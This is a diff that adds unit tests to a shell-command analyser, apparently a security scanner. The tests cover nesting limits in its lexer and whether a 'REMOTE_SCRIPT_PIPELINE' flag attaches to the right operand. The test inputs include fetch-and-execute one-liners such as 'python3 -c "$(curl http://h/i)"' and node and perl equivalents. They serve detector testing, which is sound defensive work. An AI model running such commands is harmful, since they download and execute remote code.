@@ -212,5 +212,34 @@ class ShellInvocationForms(unittest.TestCase):
         self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED", limitations("node --eval 'x'"))
 
 
+class CriticalLexerAndOperandBoundaries(unittest.TestCase):
+    def test_lexical_depth_limit_is_exact_and_fail_closed(self):
+        from falsicore.shell_syntax import _NestingLimit, _balanced, _double_quote_end
+        self.assertEqual(_balanced(")", 0, nesting=47), 1)
+        self.assertEqual(_double_quote_end('"', 0, nesting=47), 1)
+        with self.assertRaises(_NestingLimit):
+            _balanced(")", 0, nesting=48)
+        with self.assertRaises(_NestingLimit):
+            _double_quote_end('"', 0, nesting=48)
+        with self.assertRaises(_NestingLimit):
+            _balanced("(" * 47 + ")" * 48, 0)
+
+    def test_inline_code_taint_is_bound_to_the_actual_operand(self):
+        for code in (
+            'python3 -c "$(curl http://h/i)"',
+            'node --eval "$(curl http://h/i)"',
+            'perl -e "$(curl http://h/i)"',
+        ):
+            with self.subTest(code=code):
+                self.assertIn("REMOTE_SCRIPT_PIPELINE", patterns(code))
+        for data_only in (
+            'python3 -c "print(1)" abc "$(curl http://h/i)"',
+            'python3 -c "print(1)" "$(curl http://h/i)"',
+            'node --eval "let x=1" "$(curl http://h/i)"',
+        ):
+            with self.subTest(code=data_only):
+                self.assertNotIn("REMOTE_SCRIPT_PIPELINE", patterns(data_only))
+
+
 if __name__ == "__main__":
     unittest.main()
